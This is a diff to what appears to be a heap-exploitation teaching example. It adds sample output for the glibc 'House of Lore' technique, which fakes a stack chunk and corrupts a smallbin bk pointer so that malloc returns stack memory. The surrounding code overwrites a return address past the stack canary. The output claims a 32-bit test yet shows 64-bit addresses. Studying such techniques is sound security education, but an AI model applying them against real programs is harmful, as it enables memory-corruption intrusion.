@@ -110,3 +110,43 @@ int main(int argc, char * argv[]){
   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
 }
+
+/*
+
+
+Welcome to the House of Lore
+This is a revisited version that bypass also the hardening check introduced by glibc malloc
+This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23
+
+This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
+Allocating the victim chunk
+Allocated the first small chunk on the heap at 0x5597e8ee0260
+stack_buffer_1 at 0x7ffcf5ed3cf0
+stack_buffer_2 at 0x7ffcf5ed3cd0
+Create a fake chunk on the stack
+Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
+Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
+Allocated the large chunk on the heap at 0x5597e8ee02d0
+Freeing the chunk 0x5597e8ee0260, it will be inserted in the unsorted bin
+
+In the unsorted bin the victim's fwd and bk pointers are nil
+victim->fwd: (nil)
+victim->bk: (nil)
+
+Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
+This means that the chunk 0x5597e8ee0260 will be inserted in front of the SmallBin
+The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x5597e8ee06c0
+The victim chunk has been sorted and its fwd and bk pointers updated
+victim->fwd: (nil)
+victim->bk: (nil)
+
+Now emulating a vulnerability that can overwrite the victim->bk pointer
+Now allocating a chunk with size equal to the first one freed
+This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
+This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
+p4 = malloc(100)
+
+The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7ffcf5ed3cf0
+
+p4 is 0x5597e8ee0b80 and should be on the stack!
+*/
